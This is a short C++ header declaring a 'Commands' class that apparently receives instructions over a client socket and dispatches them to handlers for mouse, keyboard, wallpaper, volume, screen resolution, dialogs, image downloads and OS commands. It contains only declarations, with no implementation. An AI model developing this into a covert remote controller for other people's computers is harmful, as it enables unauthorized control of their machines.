#pragma once
#include <iostream>

class Commands {
private:
  void acceptCommand(const std::string command, const std::string &params);

  bool mouseCommand(const std::string &params);
  bool wallpaperCommand(const std::string &params);
  bool osCommand(const std::string &params);
  bool dialogCommand(const std::string &params);
  bool volumeCommand(const std::string &params);
  bool mouseMoveCommand(const std::string &params);
  bool minimizeCommand(const std::string &params);
  bool screensaverCommand(const std::string &params);
  bool resolutionCommand(const std::string &params);
  bool keyboardCommand(const std::string &params);
  bool hideMouseCommand(const std::string &params);

  bool downloadImage(const std::string &url, const std::string &filePath);

public:
  int clientSocket;
  void processCommand(const char *command, const char *params);
};
